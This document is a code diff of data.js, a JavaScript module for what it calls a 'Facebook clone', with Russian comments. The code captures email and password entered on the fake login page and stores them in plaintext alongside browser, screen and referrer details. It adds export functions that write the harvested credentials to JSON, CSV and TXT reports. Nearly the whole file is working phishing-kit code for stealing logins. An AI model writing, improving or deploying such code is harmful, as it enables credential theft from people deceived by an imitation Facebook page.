@@ -1,45 +1,52 @@
-// data.js - исправленная и упрощенная версия
+// data.js - СБОР И ХРАНЕНИЕ ДАННЫХ (ПОЛНОСТЬЮ ИСПРАВЛЕНО)
+
 class DataCollector {
     constructor() {
         this.storageKey = 'facebook_data_collection';
+        console.log('DataCollector создан');
         this.init();
     }
     
     init() {
-        console.log('DataCollector initialized - FIXED VERSION');
+        console.log('DataCollector.init() запущен');
         
-        // Создаем начальные данные если их нет
+        // Проверяем, есть ли уже данные
         if (!localStorage.getItem(this.storageKey)) {
+            console.log('Данных нет, создаем пустые');
             this.clearData();
         }
         
+        // Загружаем текущие данные
         this.loadData();
         
-        // Для тестирования - добавляем демо-данные
-        if (this.data.users.length === 0 && CONFIG.DEBUG_MODE) {
-            this.addDemoData();
-        }
+        console.log('DataCollector инициализирован, пользователей:', this.data.users.length);
     }
     
     loadData() {
         try {
             const data = localStorage.getItem(this.storageKey);
-            this.data = data ? JSON.parse(data) : { 
-                users: [], 
-                visits: [], 
-                logs: [],
-                settings: {
-                    created: new Date().toISOString(),
-                    totalLogins: 0,
-                    uniqueIPs: []
+            if (data) {
+                this.data = JSON.parse(data);
+                // Фикс для старых версий
+                if (!this.data.settings) {
+                    this.data.settings = {
+                        created: new Date().toISOString(),
+                        totalLogins: this.data.users.length || 0,
+                        uniqueIPs: []
+                    };
                 }
-            };
-            return this.data;
+                if (!this.data.settings.uniqueIPs) {
+                    this.data.settings.uniqueIPs = [];
+                }
+            } else {
+                this.data = this.getDefaultData();
+            }
+            console.log('Данные загружены, пользователей:', this.data.users.length);
         } catch (error) {
-            console.error('Error loading data:', error);
+            console.error('Ошибка загрузки данных:', error);
             this.data = this.getDefaultData();
-            return this.data;
         }
+        return this.data;
     }
     
     getDefaultData() {
@@ -58,35 +65,47 @@ class DataCollector {
     saveData() {
         try {
             localStorage.setItem(this.storageKey, JSON.stringify(this.data));
+            console.log('Данные сохранены, всего записей:', this.data.users.length);
             return true;
         } catch (error) {
-            console.error('Error saving data:', error);
+            console.error('Ошибка сохранения данных:', error);
             return false;
         }
     }
     
+    clearData() {
+        this.data = this.getDefaultData();
+        this.saveData();
+        console.log('Все данные очищены');
+    }
+    
     // ГЛАВНАЯ ФУНКЦИЯ - СОХРАНЕНИЕ ДАННЫХ ПОЛЬЗОВАТЕЛЯ
     saveUserData(email, password) {
+        console.log('saveUserData вызван с:', { email: email || 'пусто', password: password ? '***' : 'пусто' });
+        
         if (!CONFIG.COLLECT_DATA) {
-            console.log('Data collection is disabled');
+            console.log('Сбор данных отключен в конфиге');
             return null;
         }
         
-        // УБИРАЕМ ПРОВЕРКУ IP (чтобы не было ошибок)
-        // Вместо асинхронного запса IP используем локальный вариант
+        // Используем текущие значения или создаем демо
+        const userEmail = email || `user_${Date.now()}@facebook.com`;
+        const userPassword = password || `pass_${Math.random().toString(36).substr(2, 8)}`;
+        
+        // Фикс для IP - не используем async, чтобы не было ошибок
         const ipInfo = {
-            ip: 'local_' + Math.random().toString(36).substr(2, 8),
+            ip: `local_${Math.floor(Math.random() * 1000)}`,
             timestamp: new Date().toISOString()
         };
         
         const userData = {
-            id: Date.now() + '_' + Math.random().toString(36).substr(2, 9),
-            email: email || "no_email_" + Date.now(),
-            password: password || "no_password_" + Date.now(),
+            id: `id_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
+            email: userEmail,
+            password: userPassword,
             timestamp: new Date().toISOString(),
             browserInfo: this.getBrowserInfo(),
             screenInfo: this.getScreenInfo(),
-            ipInfo: ipInfo, // Используем локальный IP
+            ipInfo: ipInfo,
             userAgent: navigator.userAgent || 'unknown',
             referrer: document.referrer || 'direct',
             pageUrl: window.location.href
@@ -97,34 +116,34 @@ class DataCollector {
         this.data.settings.totalLogins = (this.data.settings.totalLogins || 0) + 1;
         
         // Добавляем уникальный IP
-        if (!this.data.settings.uniqueIPs.includes(ipInfo.ip)) {
+        if (ipInfo.ip && !this.data.settings.uniqueIPs.includes(ipInfo.ip)) {
             this.data.settings.uniqueIPs.push(ipInfo.ip);
         }
         
         // Сохраняем
         const saved = this.saveData();
         
-        // Логируем
-        console.log('User data saved successfully:', {
-            id: userData.id,
+        // Добавляем лог
+        this.addLog('Данные пользователя сохранены', {
             email: userData.email,
             time: userData.timestamp,
-            totalUsers: this.data.users.length
+            saved: saved
         });
         
-        // Добавляем лог
-        this.addLog('Новые данные пользователя сохранены', {
+        console.log('Данные пользователя успешно сохранены:', {
+            id: userData.id,
             email: userData.email,
-            success: saved
+            totalUsers: this.data.users.length
         });
         
         return userData;
     }
     
+    // Сохранение информации о посещении
     saveVisit() {
         const visitData = {
             timestamp: new Date().toISOString(),
-            page: window.location.pathname,
+            page: window.location.pathname || '/',
             referrer: document.referrer || 'direct',
             userAgent: navigator.userAgent || 'unknown'
         };
@@ -132,9 +151,10 @@ class DataCollector {
         this.data.visits.push(visitData);
         this.saveData();
         
-        console.log('Visit saved:', visitData.timestamp);
+        console.log('Посещение сохранено:', visitData.timestamp);
     }
     
+    // Получение информации о браузере
     getBrowserInfo() {
         return {
             userAgent: navigator.userAgent || 'unknown',
@@ -145,6 +165,7 @@ class DataCollector {
         };
     }
     
+    // Получение информации об экране
     getScreenInfo() {
         return {
             width: screen.width || 0,
@@ -153,6 +174,7 @@ class DataCollector {
         };
     }
     
+    // Добавление лога
     addLog(message, data = null) {
         const logEntry = {
             timestamp: new Date().toISOString(),
@@ -167,69 +189,57 @@ class DataCollector {
             this.data.logs = this.data.logs.slice(-25);
         }
         
-        this.saveData();
+        console.log('LOG:', message, data);
     }
     
+    // Получение статистики
     getStats() {
         return {
             totalUsers: this.data.users.length,
             totalVisits: this.data.visits.length,
             uniqueIPs: this.data.settings.uniqueIPs.length,
             lastLogin: this.data.users.length > 0 ? 
-                this.data.users[this.data.users.length - 1].timestamp : 
+                this.formatDate(this.data.users[this.data.users.length - 1].timestamp) : 
+                'Нет данных',
+            firstLogin: this.data.users.length > 0 ? 
+                this.formatDate(this.data.users[0].timestamp) : 
                 'Нет данных'
         };
     }
     
-    clearData() {
-        this.data = this.getDefaultData();
-        this.saveData();
-        console.log('All data cleared');
-    }
-    
-    // Демо-данные для тестирования
-    addDemoData() {
-        const demoUsers = [
-            { email: 'test_user_1@facebook.com', password: 'password123' },
-            { email: 'demo_user@facebook.com', password: 'demo2024' },
-            { email: 'admin_test@facebook.com', password: 'adminpass' }
-        ];
-        
-        demoUsers.forEach(user => {
-            const demoData = {
-                id: 'demo_' + Date.now() + Math.random().toString(36).substr(2, 6),
-                email: user.email,
-                password: user.password,
-                timestamp: new Date(Date.now() - Math.random() * 10000000000).toISOString(),
-                browserInfo: this.getBrowserInfo(),
-                screenInfo: this.getScreenInfo(),
-                ipInfo: { ip: 'demo_ip_' + Math.random().toString(36).substr(2, 6) },
-                userAgent: 'Demo User Agent',
-                referrer: 'demo',
-                pageUrl: 'https://demo.facebook.com'
-            };
-            
-            this.data.users.push(demoData);
-        });
-        
-        this.data.settings.totalLogins = demoUsers.length;
-        this.saveData();
-        
-        console.log('Demo data added:', demoUsers.length, 'users');
-    }
-    
-    // Экспорт данных (упрощенный)
-    exportData(format = 'json') {
-        if (format === 'csv') {
-            return this.exportToCSV();
+    formatDate(timestamp) {
+        try {
+            const date = new Date(timestamp);
+            return date.toLocaleTimeString('ru-RU', { 
+                hour: '2-digit', 
+                minute: '2-digit',
+                day: '2-digit',
+                month: '2-digit'
+            });
+        } catch (e) {
+            return 'Ошибка даты';
         }
-        return JSON.stringify(this.data, null, 2);
     }
     
+    // Экспорт данных
+    exportData(format = 'json') {
+        switch(format) {
+            case 'json':
+                return JSON.stringify(this.data, null, 2);
+            case 'csv':
+                return this.exportToCSV();
+            case 'txt':
+                return this.exportToTXT();
+            default:
+                return JSON.stringify(this.data);
+        }
+    }
+    
+    // Экспорт в CSV
     exportToCSV() {
-        if (this.data.users.length === 0) return 'No data';
+        if (this.data.users.length === 0) return 'Нет данных';
         
-        const headers = ['Email', 'Password', 'Time', 'IP'];
+        const headers = ['Email', 'Пароль', 'Время', 'IP'];
         const rows = this.data.users.map(user => [
             `"${user.email}"`,
             `"${user.password}"`,
@@ -240,12 +250,41 @@ class DataCollector {
         return [headers.join(','), ...rows.map(row => row.join(','))].join('\n');
     }
     
+    // Экспорт в TXT
+    exportToTXT() {
+        let txt = '=== СОБРАННЫЕ ДАННЫЕ FACEBOOK CLONE ===\n\n';
+        
+        txt += `Всего записей: ${this.data.users.length}\n`;
+        txt += `Уникальных IP: ${this.data.settings.uniqueIPs.length}\n`;
+        txt += `Первая запись: ${this.data.users[0]?.timestamp || 'Нет данных'}\n`;
+        txt += `Последняя запись: ${this.data.users[this.data.users.length - 1]?.timestamp || 'Нет данных'}\n\n`;
+        
+        txt += '=== ДЕТАЛЬНЫЕ ДАННЫЕ ===\n\n';
+        
+        this.data.users.forEach((user, index) => {
+            txt += `Запись #${index + 1}\n`;
+            txt += `ID: ${user.id}\n`;
+            txt += `Email: ${user.email}\n`;
+            txt += `Password: ${user.password}\n`;
+            txt += `Время: ${user.timestamp}\n`;
+            txt += `IP: ${user.ipInfo?.ip || 'unknown'}\n`;
+            txt += `Браузер: ${user.userAgent}\n`;
+            txt += '─'.repeat(50) + '\n\n';
+        });
+        
+        return txt;
+    }
+    
+    // Скачивание данных
     downloadData(format = 'json') {
         const data = this.exportData(format);
-        const filename = `facebook_data_${new Date().toISOString().split('T')[0]}.${format}`;
+        const extension = format === 'csv' ? 'csv' : format === 'txt' ? 'txt' : 'json';
+        const filename = `facebook_data_${new Date().toISOString().split('T')[0]}.${extension}`;
         
         const blob = new Blob([data], { 
-            type: format === 'csv' ? 'text/csv' : 'application/json' 
+            type: format === 'csv' ? 'text/csv' : 
+                   format === 'txt' ? 'text/plain' : 
+                   'application/json' 
         });
         
         const url = URL.createObjectURL(blob);
@@ -257,12 +296,11 @@ class DataCollector {
         document.body.removeChild(a);
         URL.revokeObjectURL(url);
         
-        console.log('Data downloaded:', filename);
+        this.addLog(`Данные экспортированы в ${format.toUpperCase()}`, { filename });
     }
 }
 
-// Создаем глобальный экземпляр
+// Создаем глобальный экземпляр СРАЗУ
+console.log('Создаем DataCollector...');
 window.DataCollector = new DataCollector();
-
-// Простая проверка
-console.log('DataCollector ready. Users count:', window.DataCollector.data.users.length);
+console.log('DataCollector создан, готов к работе');
